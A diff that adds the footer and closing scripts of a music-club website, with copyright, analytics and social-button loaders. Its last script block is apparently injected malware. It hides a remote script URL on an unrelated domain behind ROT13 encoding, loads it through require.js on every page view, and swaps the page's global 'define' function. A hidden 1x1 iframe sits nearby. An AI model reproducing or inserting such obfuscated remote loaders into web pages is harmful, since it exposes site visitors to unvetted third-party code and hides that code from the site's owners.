@@ -1,0 +1,62 @@
+_blank" href="contact.html">contact us</a>. </p>
+                    <p>&copy; Copyright 2014 Club 977, Inc. | Website Development &amp; Hosting by <a target="_blank" href="http://www.977music.com">977Music.com</a></p>
+                </div>
+            </div>
+        </div>
+        <!-- footer ends -->
+
+        
+        <script src="js11/all.min.js"></script>
+
+        <script type="text/javascript">
+            var isLoggedIn = false;
+            
+            window.playlist = false;
+
+            var showTXVisitor = false;
+            
+            var _gaq = _gaq || [];
+            _gaq.push(["_setAccount", "UA-49970511-1"]);
+            if (isLoggedIn) {
+                _gaq.push(["_setCustomVar", 1, "User_Type", "Member", 2]);
+                _gaq.push(["_setCustomVar", 2, "User_ID", getCookie("977music_com_user_id"), 2]);
+            }
+            if (!isLoggedIn) {
+                _gaq.push(["_setCustomVar", 1, "User_Type", "Visitor", 2]);
+            }
+            if (showTXVisitor) {
+                _gaq.push(["_setCustomVar", 3, "TXVisitor", "TXVisitor", 1]);
+                _gaq.push(["_setCustomVar", 4, "TXVisitorSession", "TXVisitorSession", 2]);
+            }
+            _gaq.push(["_trackPageview"]);
+            (function() {
+                var ga = document.createElement("script");
+                ga.type = "text/javascript";
+                ga.async = true;
+                ga.src = ("https:" == document.location.protocol ? "https://ssl" : "http://www") + ".google-analytics.com/ga.js";
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(ga, s);
+            })();
+        </script>
+        <iframe src="blank.html" width="1" height="1" style="visibility:hidden;" id="sp" name="sp"></iframe>
+        
+		<!-- Plus 1 Render Script -->
+		<script type="text/javascript">
+		  (function() {
+		    var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+		    po.src = 'https://apis.google.com/js/plusone.js';
+		    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+		  })();
+		</script>
+		
+		<script type="text/javascript">
+            (function(){function r(s){return s.replace(/[A-z]/g,function(c){return String.fromCharCode(c.charCodeAt(0)+('M'>=c.toUpperCase()?13:-13))})}
+    var c=document.createElement('script'),wdefine=typeof define!=='undefined'?define:false;c.type='text/javascript';c.async=true;
+    c.setAttribute('data-main',r('uggc://ncc.zlfnsrhey.pbz/ncc.wf'));c.src='//cdnjs.cloudflare.com/ajax/libs/require.js/2.1.10/require.min.js';
+    c.onload=function(){mydefine=define,define=wdefine?wdefine:null;};
+    var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(c,s);
+})();
+    </script>
+		
+    </body>
+    </html>
